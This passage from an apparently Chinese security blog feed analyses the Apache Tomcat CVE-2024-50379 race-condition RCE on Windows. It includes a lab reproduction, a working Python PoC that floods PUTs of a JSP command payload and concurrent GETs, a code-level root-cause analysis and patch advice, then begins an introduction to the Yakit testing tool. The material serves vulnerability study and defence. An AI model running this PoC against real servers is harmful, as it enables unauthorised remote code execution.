tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>readonly<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">&gt;</span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>put上传1.jsp，无法上传。</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.28.43.png" style="zoom:50%;"><h3 id="2-2-1-尝试CVE-2017-12615绕过"><a href="#2-2-1-尝试CVE-2017-12615绕过" class="headerlink" title="2.2.1 尝试CVE-2017-12615绕过"></a>2.2.1 尝试CVE-2017-12615绕过</h3><ul><li>/ （失败）</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.34.25.png" style="zoom:50%;"><ul><li>%00 （失败）</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.35.22.png" style="zoom:50%;"><ul><li>空格 （失败）</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.35.56.png" style="zoom:50%;"><ul><li>改变大小写（成功上传✅，但不会解析执行，无法触发RCE）</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.36.52.png" style="zoom:50%;"><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.37.58.png" style="zoom:50%;"><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.39.08.png" style="zoom:50%;"><p>用get访问时1.Jsp时不会触发RCE。</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.40.03.png" style="zoom:50%;"><p>访问1.jsp是资源不存在。</p><h3 id="2-2-1-手动将1-Jsp改成1-jsp触发RCE"><a href="#2-2-1-手动将1-Jsp改成1-jsp触发RCE" class="headerlink" title="2.2.1 手动将1.Jsp改成1.jsp触发RCE"></a>2.2.1 手动将1.Jsp改成1.jsp触发RCE</h3><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.41.42.png" style="zoom:80%;"><p>发送get请求：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GET /1.jsp HTTP/1.1Host: <span class="token number">192.168</span>.155.19:8080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.42.19.png" style="zoom:50%;"><p>成功触发RCE，弹出计算器。</p><h3 id="2-2-2-基于条件竞争触发RCE"><a href="#2-2-2-基于条件竞争触发RCE" class="headerlink" title="2.2.2 基于条件竞争触发RCE"></a>2.2.2 基于条件竞争触发RCE</h3><p>现在的情况是，我们能够上传类似poc.Jsp的文件，但是GET poc.Jsp并不会触发服务端执行恶意代码，只有GET poc.jsp时会触发RCE。</p><p>基于CVE-2024-50379，我们并发的上传poc.Jsp，并且也并发的GET poc.jsp，只要在合适的时间窗口内（具体这个窗口的原理后续分析）就能够成功触发恶意代码的执行。</p><ul><li>PUT poc.Jsp</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.51.51.png" style="zoom:50%;"><ul><li>GET poc.jsp</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.53.24.png" style="zoom:50%;"><p>因为要尽可能的在一个时间窗口内触发，GET请求的并发线程数多一些。</p><p>单独有前两个线程没有触发成功的话可以再添加一个并发的PUT请求。</p><ul><li>再添加一个PUT poc2.Jsp</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2017.01.32.png" style="zoom:50%;"><p>还是没能触发。</p><p>GET poc.jsp 并发线程设置为10000也没能触发成功，后又改回5000.</p><p>如果想成功率高一点建议用虚拟机，把内核、内存大小设置小一点。</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2017.14.18.png" alt="原设置" style="zoom:50%;"><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2017.15.49.png" alt="内存改到256M" style="zoom:50%;"><p>比较随缘。在执行到后期通常都会成功，需要耐心等待一下，如下图所示。</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-27%2010.12.34.png" style="zoom:67%;"><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-27%2010.14.40.png" style="zoom:50%;"><p>从上图可以看到，本来服务端不存在evil.jsp恶意代码文件（有的只是evil.Jsp），但是在条件竞争的情况下被成功GET并执行了。</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-27%2010.17.23.png" style="zoom:50%;"><p>下面结合POC一起打的时候也成功了。</p><h2 id="2-3-POC"><a href="#2-3-POC" class="headerlink" title="2.3 POC"></a>2.3 POC</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> asyncio<span class="token keyword">import</span> aiohttp<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">send_request</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> method<span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">async</span> <span class="token keyword">with</span> session<span class="token punctuation">.</span>request<span class="token punctuation">(</span>method<span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span> <span class="token keyword">as</span> response<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Request to </span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string"> completed with status </span><span class="token interpolation"><span class="token punctuation">{</span>response<span class="token punctuation">.</span>status<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token keyword">await</span> response<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Request to </span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string"> failed: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">async</span> <span class="token keyword">with</span> aiohttp<span class="token punctuation">.</span>ClientSession<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>        tasks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 循环100次</span>            tasks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>send_request<span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token string">'PUT'</span><span class="token punctuation">,</span> <span class="token string">'http://192.168.155.19:8080/evil.Jsp'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string">'&lt;% Runtime.getRuntime().exec("calc.exe");%&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            tasks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>send_request<span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token string">'PUT'</span><span class="token punctuation">,</span> <span class="token string">'http://192.168.155.19:8080/test.Jsp'</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token string">'&lt;% Runtime.getRuntime().exec("calc.exe");%&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            tasks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>send_request<span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'http://192.168.155.19:8080/evil.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment"># 并发执行所有任务</span>        responses <span class="token operator">=</span> <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>gather<span class="token punctuation">(</span><span class="token operator">*</span>tasks<span class="token punctuation">)</span>        <span class="token comment"># 打印部分响应结果（可选）</span>        <span class="token keyword">for</span> i<span class="token punctuation">,</span> response <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>responses<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> response<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Response </span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">}</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">{</span>response<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">100]</span><span class="token punctuation">}</span></span><span class="token string">..."</span></span><span class="token punctuation">)</span><span class="token comment"># 运行主函数</span>asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以使用POC+yakit一起打。</p><p>成功弹出大量的计算器，表明恶意代码成功执行了。</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-27%2009.00.02.png" style="zoom:50%;"><h1 id="三、代码审计——底层原理剖析"><a href="#三、代码审计——底层原理剖析" class="headerlink" title="三、代码审计——底层原理剖析"></a>三、代码审计——底层原理剖析</h1><p>CVE-2024-50379是一个Apache Tomcat的条件竞争漏洞，其底层原理涉及到Windows文件系统和Tomcat在路径大小写处理上的不一致性。</p><h2 id="3-1-File对象的getCanonicalPath方法和exists方法"><a href="#3-1-File对象的getCanonicalPath方法和exists方法" class="headerlink" title="3.1 File对象的getCanonicalPath方法和exists方法"></a>3.1 <code>File</code>对象的<code>getCanonicalPath</code>方法和<code>exists</code>方法</h2><p>这段Java代码是一个简单的测试程序，用于演示<code>File</code>对象的<code>getCanonicalPath</code>方法和<code>exists</code>方法的行为。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyTest</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">SimpleDateFormat</span> sdf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleDateFormat</span><span class="token punctuation">(</span><span class="token string">"HH:mm:ss"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"D:\\dev\\apache-tomcat-9.0.98\\webapps\\ROOT\\poc2.jsp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">String</span> canonicalPath <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">getCanonicalPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sdf<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\t"</span> <span class="token operator">+</span> canonicalPath <span class="token operator">+</span> <span class="token string">"\t"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">"yes"</span> <span class="token operator">:</span> <span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这段Java代码是一个简单的测试程序，用于演示<code>File</code>对象的<code>getCanonicalPath</code>方法和<code>exists</code>方法的行为。下面是对这段代码的详细解释：</p><ol><li><strong>SimpleDateFormat 类</strong>：<ul><li><code>SimpleDateFormat</code> 是一个用于格式化和解析日期的类。在这里，它被用来以 <code>"HH:mm:ss"</code> 的格式显示当前时间。</li></ul></li><li><code>File</code> 是一个抽象的类，用于表示文件和目录路径名的抽象表示形式。它提供了一些方法来操作实际的文件和目录。</li><li><strong>getCanonicalPath 方法</strong>：<ul><li><code>getCanonicalPath</code> 方法被调用来获取文件的规范化路径。规范化路径是一个绝对路径，它消除了所有相对路径的引用（如 <code>.</code> 和 <code>..</code>），并且反映了文件系统的实际大小写。</li></ul></li><li>**TimeUnit.SECONDS.sleep(1)**：<ul><li>程序在每次循环后暂停1秒钟。<code>TimeUnit.SECONDS.sleep(1)</code> 是一个静态导入，它使程序在继续下一次循环之前休眠1秒。</li></ul></li></ol><p>在CVE-2024-50379漏洞的上下文中，这段代码可以用来展示在Windows文件系统中，文件名的大小写是如何被处理的，以及这如何可能影响Tomcat服务器的行为。</p></blockquote><ul><li>当磁盘目录上不存在poc2.jsp时，会看到这样的输出：</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2014.24.54.png" alt="截屏2024-12-26 14.24.54" style="zoom:40%;"><ul><li>模拟执行PUT /poc2.JSP 上传一个poc2.JSP文件，会发现getCanonicalPath函数将JSP转换为了小写的jsp，且exists函数判断小写的jsp文件存在：</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2014.25.22.png" alt="截屏2024-12-26 14.25.22" style="zoom:50%;"><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2014.25.46.png" style="zoom:40%;"><ul><li>再等待几秒后会发现：小写的jsp后缀变为了大写的JSP，但此时exists函数仍然判断小写的jsp文件存在（这是因为windows对大小写不敏感的原因，windows上任务1.JSP和1.jsp是一个文件）：</li></ul><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2014.26.14.png" style="zoom:40%;"><p>这是JDK 1.8 java.io.File#getCanonicalPath 方法在Windows上的表现。Tomcat的这个漏洞也正是利用了这个特点。</p><h2 id="3-2-Tomcat漏洞源代码分析-9-0-63为例"><a href="#3-2-Tomcat漏洞源代码分析-9-0-63为例" class="headerlink" title="3.2 Tomcat漏洞源代码分析(9.0.63为例)"></a>3.2 Tomcat漏洞源代码分析(9.0.63为例)</h2><p>在tomcat源码中，org.apache.catalina.webresources.AbstractFileResourceSet#<code>file</code> 方法第94行调用了getCanonicalPath方法</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2014.43.01.png" style="zoom:45%;"><p>从上面小节的演示来看，当刚刚执行 PUT /poc2.JSP 操作后，canPath是一个小写的 .jsp 结尾的文件。</p><p>然后回到上层<code>getResource</code>方法中，第105行判断文件是否存在，由于此时已经上传了 poc*.JSP 文件，f.exists()会返回true（windows大小写不敏感），于是在第111行返回了一个 FileResource 对象，有了这个FileResource对象tomcat就会找到相应的jsp并编译成servlet执行，于是RCE就触发了。</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2014.49.27.png" style="zoom:80%;"><p>为什么再过几秒之后就无法触发了呢？换言之为什么这个漏洞称之为条件竞争呢？</p><p>因为过了这个时间差之后，file.getCanonicalPath 获取的值就变为了 *.JSP 大写结尾的路径，但调用 file.getAbsolutePath() 方法依然会返回 *.jsp 小写结尾的路径，于是 file 方法第141行的equals方法会返回false，再取反为true，于是执行到145行返回一个null：</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2014.58.56.png" alt="file.getAbsolutePath返回小写的jsp" style="zoom:50%;"><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2015.00.11.png" style="zoom:50%;"><p>再返回上层getResource方法中，此时得到的 f 是null，则会返回一个空资源 EmptyResource：</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2015.01.19.png" style="zoom:50%;"><p>空资源代表不存在，于是tomcat会返回404 。</p><p>所以这个漏洞要想利用必须打时间差，在 .jsp 变为 .JSP 之前。此所谓“条件竞争”。</p><h2 id="3-3-总结"><a href="#3-3-总结" class="headerlink" title="3.3 总结"></a>3.3 总结</h2><ol><li><p>Windows文件系统与Tomcat的大小写敏感性差异：</p><p>Windows文件系统是不区分大小写的，而Tomcat在处理文件路径时默认是区分大小写的。这个差异被攻击者利用来绕过Tomcat的路径校验机制。</p></li><li><p>在Tomcat源码中，<code>org.apache.catalina.webresources.AbstractFileResourceSet#file</code>方法调用了<code>getCanonicalPath</code>方法。当执行PUT操作后，<code>getCanonicalPath</code>返回的是小写.jsp结尾的文件，然后Tomcat会检查文件是否存在，由于文件已经上传，<code>f.exists()</code>会返回true（Windows大小写不敏感），于是返回了一个<code>FileResource</code>对象，导致Tomcat找到相应的jsp并编译成servlet执行，触发RCE。</p></li><li><p>时间差利用：</p><p>攻击者必须在<code>.jsp</code>变为<code>.JSP</code>之前利用这个漏洞，因为过了这个时间差之后，<code>file.getCanonicalPath</code>获取的值就变成了大写结尾的路径，但调用<code>file.getAbsolutePath()</code>方法依然会返回小写结尾的路径，导致后续的路径检查失败，Tomcat会返回404错误。</p></li></ol><p>综上所述，CVE-2024-50379漏洞利用了Windows文件系统和Tomcat在大小写处理上的差异，通过条件竞争的方式，使得攻击者能够上传并执行恶意代码。</p><h1 id="四、修复建议"><a href="#四、修复建议" class="headerlink" title="四、修复建议"></a>四、修复建议</h1><ul><li>Apache官方已经发布了安全通告并发布了修复版本，建议用户尽快升级到以下版本：<ul><li>Apache Tomcat 11.0.2 或更高版本</li><li>Apache Tomcat 10.1.34 或更高版本</li><li>Apache Tomcat 9.0.98 或更高版本</li></ul></li><li>官方下载链接：<ul><li>11版本：<a href="https://tomcat.apache.org/download-11.cgi">下载链接</a></li><li>10版本：<a href="https://tomcat.apache.org/download-10.cgi">下载链接</a></li><li>9版本：<a href="https://tomcat.apache.org/download-90.cgi">下载链接</a>。</li></ul></li></ul><ul><li><p><strong>临时缓解措施</strong>：</p><ul><li><p>在不影响业务的前提下将<code>conf/web.xml</code>文件中的<code>readOnly</code>参数设置为<code>true</code>或直接注释该参数；</p></li><li><p>禁用PUT方法并重启Tomcat服务以启用新的配置。</p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞知识库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞知识库 </tag>
            
            <tag> 条件竞争RCE </tag>
            
            <tag> Apache-Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Yakit单兵安全能力平台</title>
      <link href="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/"/>
      <url>/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Yakit介绍"><a href="#一、Yakit介绍" class="headerlink" title="一、Yakit介绍"></a>一、Yakit介绍</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><p>Yakit是一款集成化的网络安全单兵工具，基于Yak语言开发，提供图形化界面，旨在简化安全测试流程。它集成了多种功能，包括MITM攻击、Web模糊测试等，支持从信息收集到攻击实施的渗透测试全流程。Yakit通过模块化设计，结合Yaklang语言和gRPC通信层，确保了灵活性和扩展性。用户无需编写代码即可执行复杂测试，同时支持自定义脚本以满足特定需求。Yakit强调在合法授权下使用，以确保所有安全测试活动合规合法。</p><p>Yak 语言核心提供了非常强大的安全能力，为了让 Yak 本身的安全能力更容易贴近大家的实际使用，降低使用的门槛，我们在为 Yak 编写了 gRPC 服务器，并使用这个服务器实现 / 构建了一个客户端：Yakit。</p><p>Yakit 是 Yak 的衍生项目，对于一些不想写代码的安全从业者，Yakit会为Yak中所有的能力提供合适的GUI，通过Yakit的GUI去操控引擎的能力，随着版本更迭，GUI会更加成熟。Yakit的gRPC服务器，让用户部署更加方便快捷，与平台无关，可选择远程部署或直接本地启动在主机中使用。</p><p>能做到什么？</p><ol><li>类 Burpsuite 的 MITM 劫持操作台</li><li>查看所有劫持到的请求的历史记录以及分析请求的参数</li><li>全球第一个可视化的 Web 模糊测试工具：Web Fuzzer</li><li>Yak Cloud IDE：内置智能提示的 Yak 语言云 IDE</li><li>ShellReceiver：开启 TCP 服务器接收反弹交互式 Shell 的反连</li><li>第三方 Yak 模块商店：社区主导的第三方 Yak 模块插件，你想要的应有尽有</li></ol><h2 id="1-2-Yakit架构"><a href="#1-2-Yakit架构" class="headerlink" title="1.2 Yakit架构"></a>1.2 Yakit架构</h2><p>Yakit 的核心并不在工具本身上，而是依托于 Yak gRPC 接口； 也就是说，我们可以仅仅只把 Yakit 当作一个 “视窗” 来操纵 Yak 引擎来完成我们想要实现的安全能力。</p><p>用一张图来简单解释一下 Yakit 的架构是怎么样与传统安全工具有所区别的：</p><img src="/2024/12/24/gong-fang-gong-ju-ku/yakit-dan-bing-an-quan-neng-li-ping-tai/%E6%88%AA%E5%B1%8F2024-12-24%2009.16.11.png" style="zoom:40%;"><ul><li>Yakit 的能力需要 Yak 引擎</li></ul><p>​Yakit 所有的能力都建立在 Yak 引擎提供对应版本的 gRPC 接口支持的基础上。</p><p>​所以，Yak 引擎启动之后，Yakit 才能连接执行各种各样的安全能力。</p><h2 id="1-3-用户数据与本地文件存储"><a href="#1-3-用户数据与本地文件存储" class="headerlink" title="1.3 用户数据与本地文件存储"></a>1.3 用户数据与本地文件存储</h2><p>一般来说，本地文件与用户存储数据将会存储在 <code>$HOME/yakit-projects/</code> 目录下。</p><ul><li><p>目录中的文件包括</p><ol><li><p>MITM 需要用到的根证书与根证书的密钥</p></li><li><p>sqlite3 格式的数据库，数据库的内容是 Yakit 使用的记录，包括劫持到的请求，PoC等</p></li></ol></li></ul><p>如果本地数据库权限配置不合理，将会导致无法写入数据等问题造成 Yakit 功能不可用。</p><p>可以通过如下方式修复:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chown</span> <span class="token parameter variable">-R</span> user ~/yakit-projects<span class="token function">sudo</span> <span class="token function">chmod</span> 0755 ~/yakit-projects<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="二、安装部署"><a href="#二、安装部署" class="headerlink" title="二、安装部署"></a>二、安装部署</h1><h2 id="2-1-客户端安装"><a href="#2-1-客户端安装" class="headerlink" title="2.1 客户端安装"></a>2.1 客户端安装</h2><p><a href="https://yaklang.com/">https://yaklang.com/</a> 【下载地址】</p><h2 id="2-2-核心引擎"><a href="#2-2-核心引擎" class="headerlink" title="2.2 核心引擎"></a>2.2 